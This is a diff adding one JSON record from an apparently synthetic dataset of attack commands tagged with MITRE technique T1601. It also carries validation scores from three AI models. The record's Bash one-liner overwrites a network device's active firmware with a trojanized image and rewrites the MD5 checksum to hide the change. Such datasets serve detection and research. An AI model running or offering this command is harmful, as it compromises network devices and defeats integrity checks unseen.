@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1601",
+  "platform": "Network Devices",
+  "shell": "Bash",
+  "command": "cp -f /tmp/active.img.trojan /bootflash/active.img && sync && md5sum /bootflash/active.img > /etc/firmware/active.img.md5",
+  "explanation": "Replaces the active system image with a trojanized image and immediately updates the checksum file to conceal the change.",
+  "rationale_steps": [
+    "Overwrite the active system image with a modified file",
+    "Flush writes to storage to ensure persistence",
+    "Recalculate and overwrite the stored MD5 to hide tampering"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1601-3f5b9fd2-3d232f82",
+  "source_prompt_hash": "3f5b9fd2",
+  "timestamp_utc": "2025-09-30T04:34:26.844102Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed Bash one-liner using valid commands, flags, && chaining, and redirection with no quoting or parsing issues.",
+        "semantic_score": 3,
+        "semantic_justification": "Conceptually matches T1601 by overwriting the system image and updating a checksum to mask changes, but it unrealistically assumes no privileges and uses paths/mechanisms that may not exist on many network devices.",
+        "combined_score": 4.0,
+        "confidence": 0.7,
+        "timestamp": "2025-10-02T19:30:49.650920Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with valid use of `&&` chaining, proper flags (`-f`), correct `md5sum` redirection syntax, and no quoting or parsing issues.",
+        "semantic_score": 5,
+        "semantic_justification": "The command precisely implements T1601 by replacing the active firmware image with a trojanized version, flushing writes with `sync`, and immediately overwriting the checksum file to defeat integrity verification — a realistic and operationally coherent attack sequence on network devices.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2026-02-19T01:24:19.044301Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command uses valid Bash syntax, standard flags, and correct logical operators to sequence the operations.",
+        "semantic_score": 5,
+        "semantic_justification": "The sequence correctly overwrites a system image, ensures disk persistence with sync, and attempts to bypass integrity checks by updating a checksum file, perfectly matching T1601.",
+        "combined_score": 5.0,
+        "confidence": 1.0,
+        "timestamp": "2026-02-19T01:24:21.500461Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.333,
+    "llm_average_score": 4.667,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
